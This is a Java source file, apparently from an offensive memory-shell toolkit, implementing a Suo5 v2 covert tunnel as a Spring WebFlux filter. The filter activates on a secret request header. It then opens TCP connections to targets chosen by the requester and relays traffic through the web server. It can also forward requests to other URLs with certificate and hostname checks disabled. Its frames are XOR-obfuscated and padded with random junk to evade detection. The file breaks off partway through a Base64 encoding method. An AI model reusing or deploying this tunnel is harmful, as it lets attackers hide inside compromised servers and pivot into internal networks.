package com.reajason.javaweb.memshell.shelltool.suo5;

import io.netty.channel.ChannelOption;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;
import reactor.core.publisher.SignalType;
import reactor.core.publisher.Sinks;
import reactor.core.scheduler.Schedulers;
import reactor.netty.Connection;
import reactor.netty.NettyOutbound;
import reactor.netty.tcp.TcpClient;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;

/**
 * Suo5 v2 for Spring WebFlux.
 * <p>
 * The v2 protocol adds a handshake/session id, three transport modes and optional
 * template/dirty padding on top of the v1 stream format, so this is a reactive
 * implementation rather than a port of the servlet based {@link Suo5} core.
 * <p>
 * This class must stay self contained (JDK/Spring/Reactor types and lambdas only):
 * the generator redefines it into a single shell class, so nested or anonymous
 * classes would be missing at runtime.
 *
 * @author ReaJason
 * @since 2025/12/9
 */
public class Suo5WebFilter implements WebFilter, X509TrustManager, HostnameVerifier {
    public static String headerName;
    public static String headerValue;

    private static final ConcurrentHashMap<String, Object> ctx = new ConcurrentHashMap<String, Object>();
    private static final HashMap<String, Boolean> localAddrs = collectAddr();

    private static final int MAX_LEN = 1024 * 1024 * 32;
    private static final int BUF_SIZE = 1024 * 16;
    private static final int CLASSIC_READ_MAX = 512 * 1024;
    private static final char[] SID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();

    private static final byte ACTION_CREATE = 0x00;
    private static final byte ACTION_DATA = 0x01;
    private static final byte ACTION_DELETE = 0x02;
    private static final byte ACTION_STATUS = 0x03;
    private static final byte ACTION_HEARTBEAT = 0x10;
    private static final byte ACTION_DIRTY = 0x11;

    private static final byte MODE_HANDSHAKE = 0x00;
    private static final byte MODE_FULL = 0x01;
    private static final byte MODE_HALF = 0x02;
    private static final byte MODE_CLASSIC = 0x03;

    // body state keys
    private static final String S_FIRST = "first";
    private static final String S_DONE = "done";
    private static final String S_FRAMES = "frames";
    private static final String S_PENDING = "pending";
    private static final String S_STREAMING = "streaming";
    private static final String S_FIRST_SEEN = "firstSeen";
    private static final String S_CONSUMER = "consumer";

    // tunnel state keys
    private static final String T_ID = "id";
    private static final String T_CONN = "conn";
    private static final String T_OUT = "out";
    private static final String T_SINK = "sink";
    private static final String T_LOCK = "lock";
    private static final String T_DIRTY = "dirty";
    private static final String T_END = "end";
    private static final String T_QUEUE = "queue";
    private static final String T_CLOSED = "closed";

    public Suo5WebFilter() {
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        ServerHttpResponse response = exchange.getResponse();
        if (headerName == null || headerValue == null) {
            return chain.filter(exchange);
        }
        String value = request.getHeaders().getFirst(headerName);
        if (value == null || !value.contains(headerValue)) {
            return chain.filter(exchange);
        }

        final HashMap<String, Object> state = newBodyState();
        final byte[][] buffer = new byte[][]{new byte[8192]};
        final int[] length = new int[]{0};
        final Consumer<HashMap<String, byte[]>> onFrame = frame -> onFrame(state, frame);

        request.getBody()
                .subscribeOn(Schedulers.boundedElastic())
                .subscribe(dataBuffer -> {
                    try {
                        int size = dataBuffer.readableByteCount();
                        byte[] bytes = new byte[size];
                        dataBuffer.read(bytes);
                        feed(buffer, length, bytes, onFrame);
                    } catch (Throwable t) {
                        error(state, t);
                    } finally {
                        DataBufferUtils.release(dataBuffer);
                    }
                }, error -> error(state, error), () -> ((Sinks.One<Void>) state.get(S_DONE)).tryEmitEmpty());

        return ((Sinks.One<HashMap<String, byte[]>>) state.get(S_FIRST)).asMono()
                .flatMap(dataMap -> Mono.defer(() -> dispatch(exchange, dataMap, state))
                        .subscribeOn(Schedulers.boundedElastic()))
                .onErrorResume(t -> {
                    try {
                        return response.setComplete();
                    } catch (Throwable ignored) {
                        return Mono.empty();
                    }
                });
    }

    private Mono<Void> dispatch(ServerWebExchange exchange,
                                HashMap<String, byte[]> dataMap,
                                HashMap<String, Object> state) {
        ServerHttpResponse response = exchange.getResponse();
        byte[] modeData = dataMap.get("m");
        byte[] actionData = dataMap.get("ac");
        byte[] tunIdData = dataMap.get("id");
        if (actionData == null || actionData.length != 1
                || tunIdData == null || tunIdData.length == 0
                || modeData == null || modeData.length != 1) {
            return response.setComplete();
        }
        byte mode = modeData[0];
        switch (mode) {
            case MODE_HANDSHAKE:
                return processHandshake(exchange, dataMap);
            case MODE_FULL:
                return processFullStream(exchange, dataMap, state);
            case MODE_HALF:
            case MODE_CLASSIC:
                return ((Sinks.One<Void>) state.get(S_DONE)).asMono()
                        .then(Mono.defer(() -> processBuffered(exchange, mode, state))
                                .subscribeOn(Schedulers.boundedElastic()));
            default:
                return response.setComplete();
        }
    }

    // ---------------------------------------------------------------- handshake

    private Mono<Void> processHandshake(ServerWebExchange exchange, HashMap<String, byte[]> dataMap) {
        ServerHttpResponse response = exchange.getResponse();
        String tunId = new String(dataMap.get("id"), StandardCharsets.UTF_8);
        String sid = randomString(16);

        byte[] tplData = dataMap.get("tpl");
        byte[] ctData = dataMap.get("ct");
        if (tplData != null && tplData.length > 0 && ctData != null && ctData.length > 0) {
            String[] parts = new String(tplData, StandardCharsets.UTF_8).split("#data#", 2);
            if (parts.length == 2) {
                ctx.put(sid, new String[]{new String(ctData, StandardCharsets.UTF_8), parts[0], parts[1]});
            } else {
                ctx.put(sid, new String[0]);
            }
        } else {
            ctx.put(sid, new String[0]);
        }

        byte[] dirtySizeData = dataMap.get("jk");
        if (dirtySizeData != null && dirtySizeData.length > 0) {
            int dirtySize = 0;
            try {
                dirtySize = Integer.parseInt(new String(dirtySizeData, StandardCharsets.UTF_8));
            } catch (NumberFormatException ignored) {
            }
            if (dirtySize < 0) {
                dirtySize = 0;
            }
            ctx.put(sid + "_jk", dirtySize);
        }

        byte[] redirectData = dataMap.get("r");
        if (redirectData != null && redirectData.length > 0
                && !isLocalAddr(new String(redirectData, StandardCharsets.UTF_8))) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }

        boolean auto = dataMap.get("a") != null && dataMap.get("a").length > 0 && dataMap.get("a")[0] == 0x01;
        byte[] echo = dataMap.get("dt");
        if (echo == null) {
            echo = new byte[0];
        }
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);

        if (auto) {
            setBypassHeader(response);
            final Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
            final Object lock = new Object();
            emit(sink, lock, start);
            emit(sink, lock, marshalBase64(newData(tunId, echo)));
            Schedulers.parallel().schedule(() -> {
                emit(sink, lock, marshalBase64(newData(tunId, sid.getBytes(StandardCharsets.UTF_8))));
                emit(sink, lock, end);
                sink.tryEmitComplete();
            }, 2, TimeUnit.SECONDS);
            return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap));
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        write(baos, start);
        write(baos, marshalBase64(newData(tunId, echo)));
        write(baos, marshalBase64(newData(tunId, sid.getBytes(StandardCharsets.UTF_8))));
        write(baos, end);
        return writeBytes(response, baos.toByteArray());
    }

    // ------------------------------------------------------------------- modes

    private Mono<Void> processBuffered(ServerWebExchange exchange, byte mode, HashMap<String, Object> state) {
        ServerHttpResponse response = exchange.getResponse();
        List<HashMap<String, byte[]>> frames = (List<HashMap<String, byte[]>>) state.get(S_FRAMES);

        if (frames.isEmpty()) {
            return response.setComplete();
        }

        HashMap<String, byte[]> first = frames.get(0);
        byte[] redirectData = first.get("r");
        if (redirectData != null && redirectData.length > 0
                && !isLocalAddr(new String(redirectData, StandardCharsets.UTF_8))) {
            return processRedirect(exchange, frames, new String(redirectData, StandardCharsets.UTF_8));
        }

        byte[] sidData = first.get("sid");
        if (sidData == null || sidData.length == 0) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }
        String sid = new String(sidData, StandardCharsets.UTF_8);
        if (!ctx.containsKey(sid)) {
            response.setStatusCode(HttpStatus.FORBIDDEN);
            return response.setComplete();
        }

        int dirtySize = dirtySize(sid);
        if (mode == MODE_HALF) {
            return processHalf(exchange.getRequest(), response, frames, sid, dirtySize);
        }
        return processClassic(exchange.getRequest(), response, frames, sid);
    }

    @SuppressWarnings("unchecked")
    private Mono<Void> processHalf(ServerHttpRequest request,
                                   ServerHttpResponse response,
                                   List<HashMap<String, byte[]>> frames,
                                   String sid,
                                   int dirtySize) {
        setBypassHeader(response);
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);

        final Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
        final Object lock = new Object();
        final AtomicReference<HashMap<String, Object>> createdTunnel =
                new AtomicReference<HashMap<String, Object>>();
        boolean created = false;

        for (HashMap<String, byte[]> dataMap : frames) {
            byte[] actionData = dataMap.get("ac");
            byte[] tunIdData = dataMap.get("id");
            if (actionData == null || actionData.length != 1 || tunIdData == null) {
                continue;
            }
            String tunId = new String(tunIdData, StandardCharsets.UTF_8);
            byte action = actionData[0];
            if (action == ACTION_CREATE) {
                if (created) {
                    emit(sink, lock, marshalBase64(newStatus(tunId, (byte) 0x00)), dirtySize);
                    continue;
                }
                created = true;
                emit(sink, lock, start, dirtySize);
                boolean ok = halfCreate(request, dataMap, tunId, sink, lock, dirtySize, end, createdTunnel);
                if (!ok) {
                    emit(sink, lock, marshalBase64(newStatus(tunId, (byte) 0x01)), dirtySize);
                    emit(sink, lock, end, dirtySize);
                    sink.tryEmitComplete();
                    return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap));
                }
            } else if (action == ACTION_DATA) {
                if (!halfWrite(dataMap, tunId)) {
                    emit(sink, lock, marshalBase64(newDel(tunId)), dirtySize);
                }
            } else if (action == ACTION_DELETE) {
                halfDelete(tunId);
            } else if (action == ACTION_HEARTBEAT) {
                emit(sink, lock, marshalBase64(newHeartbeat(tunId)), dirtySize);
            }
        }

        if (!created) {
            emit(sink, lock, start, dirtySize);
            emit(sink, lock, end, dirtySize);
            sink.tryEmitComplete();
        }
        return response.writeWith(sink.asFlux()
                .doFinally(signal -> {
                    if (signal == SignalType.CANCEL) {
                        halfDelete(createdTunnel.get());
                    }
                })
                .map(response.bufferFactory()::wrap));
    }

    private boolean halfCreate(ServerHttpRequest request,
                               HashMap<String, byte[]> dataMap,
                               String tunId,
                               Sinks.Many<byte[]> sink,
                               Object lock,
                               int dirtySize,
                               byte[] end,
                               AtomicReference<HashMap<String, Object>> createdTunnel) {
        try {
            InetSocketAddress target = targetAddress(request, dataMap);
            HashMap<String, Object> tunnel = new HashMap<String, Object>();
            tunnel.put(T_ID, tunId);
            tunnel.put(T_SINK, sink);
            tunnel.put(T_LOCK, lock);
            tunnel.put(T_DIRTY, dirtySize);
            tunnel.put(T_END, end);
            tunnel.put(T_CLOSED, new AtomicBoolean(false));

            TcpClient client = TcpClient.create()
                    .host(target.getHostString()).port(target.getPort())
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            Connection connection = client.connect().block(Duration.ofSeconds(3));
            if (connection == null) {
                return false;
            }
            tunnel.put(T_CONN, connection);
            tunnel.put(T_OUT, connection.outbound());
            createdTunnel.set(tunnel);
            ctx.put(tunId, tunnel);
            emit(sink, lock, marshalBase64(newStatus(tunId, (byte) 0x00)), dirtySize);
            connection.inbound().receive().asByteArray().subscribe(
                    data -> emitData(tunnel, data),
                    error -> tunnelClosed(tunnel),
                    () -> tunnelClosed(tunnel));
            connection.onDispose(() -> tunnelClosed(tunnel));
            return true;
        } catch (Throwable t) {
            HashMap<String, Object> created = createdTunnel.get();
            if (created != null) {
                halfDelete(created);
            }
            return false;
        }
    }

    @SuppressWarnings("unchecked")
    private boolean halfWrite(HashMap<String, byte[]> dataMap, String tunId) {
        Object value = ctx.get(tunId);
        if (!(value instanceof HashMap)) {
            return false;
        }
        HashMap<String, Object> tunnel = (HashMap<String, Object>) value;
        Connection connection = (Connection) tunnel.get(T_CONN);
        if (connection == null || connection.isDisposed()) {
            return false;
        }
        byte[] data = dataMap.get("dt");
        if (data != null && data.length > 0) {
            ((NettyOutbound) tunnel.get(T_OUT)).sendByteArray(Mono.just(data)).then()
                    .subscribe(d -> {
                    }, error -> tunnelClosed(tunnel));
        }
        return true;
    }

    private void halfDelete(String tunId) {
        Object value = ctx.remove(tunId);
        if (value instanceof HashMap) {
            disposeTunnel((HashMap<String, Object>) value);
        }
    }

    @SuppressWarnings("unchecked")
    private void halfDelete(HashMap<String, Object> tunnel) {
        if (tunnel != null && ctx.remove((String) tunnel.get(T_ID), tunnel)) {
            disposeTunnel(tunnel);
        }
    }

    private Mono<Void> processClassic(ServerHttpRequest request,
                                      ServerHttpResponse response,
                                      List<HashMap<String, byte[]>> frames,
                                      String sid) {
        setBypassHeader(response);
        byte[] start = templateStart(response, sid);
        byte[] end = templateEnd(sid);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        write(baos, start);

        for (HashMap<String, byte[]> dataMap : frames) {
            byte[] actionData = dataMap.get("ac");
            byte[] tunIdData = dataMap.get("id");
            if (actionData == null || actionData.length != 1 || tunIdData == null) {
                continue;
            }
            String tunId = new String(tunIdData, StandardCharsets.UTF_8);
            byte action = actionData[0];
            try {
                if (action == ACTION_CREATE) {
                    write(baos, classicCreate(request, dataMap, tunId));
                } else if (action == ACTION_DATA) {
                    classicWrite(dataMap, tunId);
                    write(baos, classicRead(tunId));
                } else if (action == ACTION_DELETE) {
                    classicDelete(tunId);
                }
            } catch (Throwable t) {
                classicDelete(tunId);
                write(baos, marshalBase64(newDel(tunId)));
            }
        }

        write(baos, end);
        return writeBytes(response, baos.toByteArray());
    }

    @SuppressWarnings("unchecked")
    private byte[] classicCreate(ServerHttpRequest request,
                                 HashMap<String, byte[]> dataMap,
                                 String tunId) {
        Object existing = ctx.get(tunId);
        if (existing instanceof HashMap) {
            return marshalBase64(newStatus(tunId, (byte) 0x00));
        }
        HashMap<String, Object> tunnel = new HashMap<String, Object>();
        tunnel.put(T_ID, tunId);
        tunnel.put(T_QUEUE, new LinkedBlockingQueue<byte[]>(100));
        tunnel.put(T_CLOSED, new AtomicBoolean(false));
        try {
            InetSocketAddress target = targetAddress(request, dataMap);
            TcpClient client = TcpClient.create()                    .host(target.getHostString()).port(target.getPort())
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            Connection connection = client.connect().block(Duration.ofSeconds(3));
            if (connection == null) {
                return marshalBase64(newStatus(tunId, (byte) 0x01));
            }
            tunnel.put(T_CONN, connection);
            tunnel.put(T_OUT, connection.outbound());
            ctx.put(tunId, tunnel);
            final BlockingQueue<byte[]> queue = (BlockingQueue<byte[]>) tunnel.get(T_QUEUE);
            final AtomicBoolean closed = (AtomicBoolean) tunnel.get(T_CLOSED);
            connection.inbound().receive().asByteArray().subscribe(
                    data -> {
                                    if (!queue.offer(data)) {
                            closed.set(true);
                            classicDelete(tunId);
                        }
                    },
                    error -> closed.set(true),
                    () -> closed.set(true));
            connection.onDispose(() -> closed.set(true));
            return marshalBase64(newStatus(tunId, (byte) 0x00));
        } catch (Throwable t) {
            disposeTunnel(tunnel);
            return marshalBase64(newStatus(tunId, (byte) 0x01));
        }
    }

    @SuppressWarnings("unchecked")
    private void classicWrite(HashMap<String, byte[]> dataMap, String tunId) {
        Object value = ctx.get(tunId);
        if (!(value instanceof HashMap)) {
            throw new IllegalStateException("tunnel not found");
        }
        HashMap<String, Object> tunnel = (HashMap<String, Object>) value;
        Connection connection = (Connection) tunnel.get(T_CONN);
        if (connection == null || connection.isDisposed()) {
            return;
        }
        byte[] data = dataMap.get("dt");
        if (data != null && data.length > 0) {
            ((NettyOutbound) tunnel.get(T_OUT)).sendByteArray(Mono.just(data)).then()
                    .block(Duration.ofSeconds(3));
        }
    }

    @SuppressWarnings("unchecked")
    private byte[] classicRead(String tunId) {
        Object value = ctx.get(tunId);
        if (!(value instanceof HashMap)) {
            return marshalBase64(newDel(tunId));
        }
        HashMap<String, Object> tunnel = (HashMap<String, Object>) value;
        BlockingQueue<byte[]> queue = (BlockingQueue<byte[]>) tunnel.get(T_QUEUE);
        AtomicBoolean closed = (AtomicBoolean) tunnel.get(T_CLOSED);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int written = 0;
        while (true) {
            byte[] data = queue.poll();
            if (data == null) {
                break;
            }
            write(out, marshalBase64(newData(tunId, data)));
            written += data.length;
            if (written >= CLASSIC_READ_MAX) {
                break;
            }
        }
        if (closed.get() && queue.isEmpty()) {
            classicDelete(tunId);
            write(out, marshalBase64(newDel(tunId)));
        }
        return out.toByteArray();
    }

    private void classicDelete(String tunId) {
        Object value = ctx.remove(tunId);
        if (value instanceof HashMap) {
            disposeTunnel((HashMap<String, Object>) value);
        }
    }

    // -------------------------------------------------------------- full stream

    private Mono<Void> processFullStream(ServerWebExchange exchange,
                                         HashMap<String, byte[]> dataMap,
                                         HashMap<String, Object> state) {
        ServerHttpRequest request = exchange.getRequest();
        ServerHttpResponse response = exchange.getResponse();
        String tunId = new String(dataMap.get("id"), StandardCharsets.UTF_8);

        setBypassHeader(response);
        response.getHeaders().setContentType(MediaType.APPLICATION_OCTET_STREAM);

        final Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
        final Object lock = new Object();
        final AtomicBoolean sendClose = new AtomicBoolean(true);
        final AtomicBoolean delSent = new AtomicBoolean(false);
        final AtomicReference<NettyOutbound> out = new AtomicReference<NettyOutbound>();

        Connection connection;
        try {
            InetSocketAddress target = targetAddress(request, dataMap);
            TcpClient client = TcpClient.create()
                    .host(target.getHostString()).port(target.getPort())
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000);
            connection = client.connect().block(Duration.ofSeconds(3));
        } catch (Throwable t) {
            connection = null;
        }

        if (connection == null) {
            emit(sink, lock, marshalBase64(newStatus(tunId, (byte) 0x01)));
            sink.tryEmitComplete();
            return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap));
        }

        final Connection conn = connection;
        final Runnable terminal = () -> {
            if (sendClose.get() && delSent.compareAndSet(false, true)) {
                emit(sink, lock, marshalBase64(newDel(tunId)));
            }
            sink.tryEmitComplete();
        };

        out.set(conn.outbound());
        emit(sink, lock, marshalBase64(newStatus(tunId, (byte) 0x00)));

        conn.inbound().receive().asByteArray().subscribe(
                data -> emit(sink, lock, marshalBase64(newData(tunId, data))),
                error -> {
                    conn.dispose();
                    terminal.run();
                },
                terminal);

        conn.onDispose(terminal::run);

        startStreaming(state, frame -> {
            byte[] actionData = frame.get("ac");
            if (actionData == null || actionData.length != 1) {
                return;
            }
            byte action = actionData[0];
            if (action == ACTION_CREATE || action == ACTION_DELETE) {
                sendClose.set(false);
            } else if (action == ACTION_DATA) {
                byte[] data = frame.get("dt");
                NettyOutbound bound = out.get();
                if (data != null && data.length > 0 && bound != null) {
                    bound.sendByteArray(Mono.just(data)).then().subscribe(d -> {
                    }, error -> {
                    });
                }
            } else if (action == ACTION_HEARTBEAT) {
                emit(sink, lock, marshalBase64(newHeartbeat(tunId)));
            }
        });

        ((Sinks.One<Void>) state.get(S_DONE)).asMono().subscribe(v -> {
            conn.dispose();
            terminal.run();
        }, error -> {
            conn.dispose();
            terminal.run();
        });

        return response.writeWith(sink.asFlux()
                .doFinally(signal -> conn.dispose())
                .map(response.bufferFactory()::wrap));
    }

    // ----------------------------------------------------------------- redirect

    private Mono<Void> processRedirect(ServerWebExchange exchange,
                                       List<HashMap<String, byte[]>> frames,
                                       String redirectUrl) {
        ServerHttpRequest request = exchange.getRequest();
        ServerHttpResponse response = exchange.getResponse();
        final Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
        try {
            ByteArrayOutputStream body = new ByteArrayOutputStream();
            for (HashMap<String, byte[]> frame : frames) {
                HashMap<String, byte[]> copy = new HashMap<String, byte[]>(frame);
                copy.remove("r");
                write(body, marshalBase64(copy));
            }
            byte[] forwardedBody = body.toByteArray();

            URL url = new URL(redirectUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(String.valueOf(request.getMethod()));
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(0);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            if (conn instanceof HttpsURLConnection) {
                SSLContext sslCtx = SSLContext.getInstance("SSL");
                sslCtx.init(null, new TrustManager[]{this}, null);
                ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
                ((HttpsURLConnection) conn).setHostnameVerifier(this);
            }
            for (String name : request.getHeaders().keySet()) {
                if (name.equalsIgnoreCase("Content-Length")
                        || name.equalsIgnoreCase("Host")
                        || name.equalsIgnoreCase("Connection")
                        || name.equalsIgnoreCase("Content-Encoding")
                        || name.equalsIgnoreCase("Transfer-Encoding")) {
                    continue;
                }
                List<String> values = request.getHeaders().get(name);
                if (values != null) {
                    for (String header : values) {
                        conn.addRequestProperty(name, header);
                    }
                }
            }
            conn.setRequestProperty("Host", url.getHost());
            conn.setFixedLengthStreamingMode(forwardedBody.length);
            OutputStream out = conn.getOutputStream();
            out.write(forwardedBody);
            out.flush();
            out.close();

            int status = conn.getResponseCode();
            try {
                response.setStatusCode(HttpStatus.valueOf(status));
            } catch (Throwable ignored) {
            }
            final InputStream in = status >= 400 ? conn.getErrorStream() : conn.getInputStream();
            Schedulers.boundedElastic().schedule(() -> {
                try {
                    if (in != null) {
                        byte[] buffer = new byte[8192];
                        int n;
                        while ((n = in.read(buffer)) > 0) {
                            byte[] data = new byte[n];
                            System.arraycopy(buffer, 0, data, 0, n);
                            sink.tryEmitNext(data);
                        }
                    }
                } catch (Throwable ignored) {
                } finally {
                    sink.tryEmitComplete();
                    conn.disconnect();
                }
            });
        } catch (Throwable t) {
            sink.tryEmitComplete();
        }
        return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap));
    }

    // -------------------------------------------------------------- body decoding

    private static HashMap<String, Object> newBodyState() {
        HashMap<String, Object> state = new HashMap<String, Object>();
        state.put(S_FIRST, Sinks.one());
        state.put(S_DONE, Sinks.one());
        state.put(S_FRAMES, Collections.synchronizedList(new ArrayList<HashMap<String, byte[]>>()));
        state.put(S_PENDING, Collections.synchronizedList(new ArrayList<HashMap<String, byte[]>>()));
        state.put(S_STREAMING, new AtomicBoolean(false));
        state.put(S_FIRST_SEEN, new AtomicBoolean(false));
        state.put(S_CONSUMER, new AtomicReference<Consumer<HashMap<String, byte[]>>>());
        return state;
    }

    @SuppressWarnings("unchecked")
    private static void onFrame(HashMap<String, Object> state, HashMap<String, byte[]> frame) {
        AtomicBoolean firstSeen = (AtomicBoolean) state.get(S_FIRST_SEEN);
        AtomicBoolean streaming = (AtomicBoolean) state.get(S_STREAMING);
        if (firstSeen.compareAndSet(false, true)) {
            byte[] mode = frame.get("m");
            boolean isFull = mode != null && mode.length == 1 && mode[0] == MODE_FULL;
            streaming.set(isFull);
            if (!isFull) {
                ((List<HashMap<String, byte[]>>) state.get(S_FRAMES)).add(frame);
            }
            ((Sinks.One<HashMap<String, byte[]>>) state.get(S_FIRST)).tryEmitValue(frame);
            return;
        }
        if (streaming.get()) {
            List<HashMap<String, byte[]>> pending = (List<HashMap<String, byte[]>>) state.get(S_PENDING);
            synchronized (pending) {
                Consumer<HashMap<String, byte[]>> consumer =
                        ((AtomicReference<Consumer<HashMap<String, byte[]>>>) state.get(S_CONSUMER)).get();
                if (consumer == null) {
                    pending.add(frame);
                } else {
                    consumer.accept(frame);
                }
            }
        } else {
            ((List<HashMap<String, byte[]>>) state.get(S_FRAMES)).add(frame);
        }
    }

    @SuppressWarnings("unchecked")
    private static void startStreaming(HashMap<String, Object> state,
                                       Consumer<HashMap<String, byte[]>> consumer) {
        List<HashMap<String, byte[]>> pending = (List<HashMap<String, byte[]>>) state.get(S_PENDING);
        synchronized (pending) {
            ((AtomicReference<Consumer<HashMap<String, byte[]>>>) state.get(S_CONSUMER)).set(consumer);
            for (HashMap<String, byte[]> frame : pending) {
                consumer.accept(frame);
            }
            pending.clear();
        }
    }

    private static void error(HashMap<String, Object> state, Throwable t) {
        ((Sinks.One<HashMap<String, byte[]>>) state.get(S_FIRST)).tryEmitError(t);
        ((Sinks.One<Void>) state.get(S_DONE)).tryEmitError(t);
    }

    // ------------------------------------------------------------- frame codec

    private static void feed(byte[][] bufferRef,
                             int[] lengthRef,
                             byte[] data,
                             Consumer<HashMap<String, byte[]>> consumer) {
        byte[] buffer = bufferRef[0];
        int length = lengthRef[0];
        if (length + data.length > buffer.length) {
            int capacity = buffer.length;
            while (capacity < length + data.length) {
                capacity <<= 1;
            }
            byte[] newBuffer = new byte[capacity];
            System.arraycopy(buffer, 0, newBuffer, 0, length);
            buffer = newBuffer;
        }
        System.arraycopy(data, 0, buffer, length, data.length);
        length += data.length;

        while (true) {
            if (length < 8) {
                break;
            }
            int dataLength;
            try {
                dataLength = frameDataLength(buffer);
            } catch (Throwable t) {
                throw new IllegalStateException("invalid frame header", t);
            }
            if (dataLength < 0 || dataLength > MAX_LEN) {
                throw new IllegalStateException("invalid frame length " + dataLength);
            }
            if (length < 8 + dataLength) {
                break;
            }
            HashMap<String, byte[]> frame;
            try {
                frame = decodeFrame(buffer, dataLength);
            } catch (Throwable t) {
                throw new IllegalStateException("invalid frame", t);
            }
            consumer.accept(frame);
            int consumed = 8 + dataLength;
            System.arraycopy(buffer, consumed, buffer, 0, length - consumed);
            length -= consumed;
        }
        bufferRef[0] = buffer;
        lengthRef[0] = length;
    }

    private static int frameDataLength(byte[] buffer) {
        byte[] header = decodeBase64Url(buffer, 0, 8);
        if (header.length != 6) {
            throw new IllegalStateException("invalid header length");
        }
        byte k0 = header[0];
        byte k1 = header[1];
        int value = ((header[2] ^ k0) & 0xFF) << 24
                | ((header[3] ^ k1) & 0xFF) << 16
                | ((header[4] ^ k0) & 0xFF) << 8
                | ((header[5] ^ k1) & 0xFF);
        if (value < 0) {
            throw new IllegalStateException("invalid frame length");
        }
        return value;
    }

    private static HashMap<String, byte[]> decodeFrame(byte[] buffer, int dataLength) {
        byte[] header = decodeBase64Url(buffer, 0, 8);
        byte k0 = header[0];
        byte k1 = header[1];
        byte[] data = decodeBase64Url(buffer, 8, dataLength);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ (i % 2 == 0 ? k0 : k1));
        }
        return unmarshal(data);
    }

    private static HashMap<String, byte[]> unmarshal(byte[] data) {
        HashMap<String, byte[]> result = new HashMap<String, byte[]>();
        int i = 0;
        while (i < data.length) {
            int keyLength = data[i] & 0xFF;
            i += 1;
            if (i + keyLength > data.length) {
                throw new IllegalStateException("key length error");
            }
            String key = new String(data, i, keyLength, StandardCharsets.UTF_8);
            i += keyLength;
            if (i + 4 > data.length) {
                throw new IllegalStateException("value length error");
            }
            int valueLength = ((data[i] & 0xFF) << 24)
                    | ((data[i + 1] & 0xFF) << 16)
                    | ((data[i + 2] & 0xFF) << 8)
                    | (data[i + 3] & 0xFF);
            i += 4;
            if (valueLength < 0 || i + valueLength > data.length) {
                throw new IllegalStateException("value error");
            }
            byte[] value = new byte[valueLength];
            System.arraycopy(data, i, value, 0, valueLength);
            i += valueLength;
            result.put(key, value);
        }
        return result;
    }

    private static byte[] marshalBase64(HashMap<String, byte[]> map) {
        Random random = new Random();
        int junkSize = random.nextInt(32);
        if (junkSize > 0) {
            byte[] junk = new byte[junkSize];
            random.nextBytes(junk);
            map.put("_", junk);
        }

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        for (Map.Entry<String, byte[]> entry : map.entrySet()) {
            byte[] key = entry.getKey().getBytes(StandardCharsets.UTF_8);
            byte[] value = entry.getValue();
            buffer.write(key.length);
            buffer.write(key, 0, key.length);
            writeU32(buffer, value.length);
            buffer.write(value, 0, value.length);
        }
        byte[] data = buffer.toByteArray();
        byte k0 = (byte) (random.nextInt(255) + 1);
        byte k1 = (byte) (random.nextInt(255) + 1);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ (i % 2 == 0 ? k0 : k1));
        }
        byte[] body = encodeBase64Url(data);
        byte[] header = new byte[6];
        header[0] = k0;
        header[1] = k1;
        header[2] = (byte) ((body.length >> 24) ^ k0);
        header[3] = (byte) ((body.length >> 16) ^ k1);
        header[4] = (byte) ((body.length >> 8) ^ k0);
        header[5] = (byte) (body.length ^ k1);
        byte[] encodedHeader = encodeBase64Url(header);
        byte[] result = new byte[encodedHeader.length + body.length];
        System.arraycopy(encodedHeader, 0, result, 0, encodedHeader.length);
        System.arraycopy(body, 0, result, encodedHeader.length, body.length);
        return result;
    }

    private static byte[] encodeBase64Url(byte[] data) {
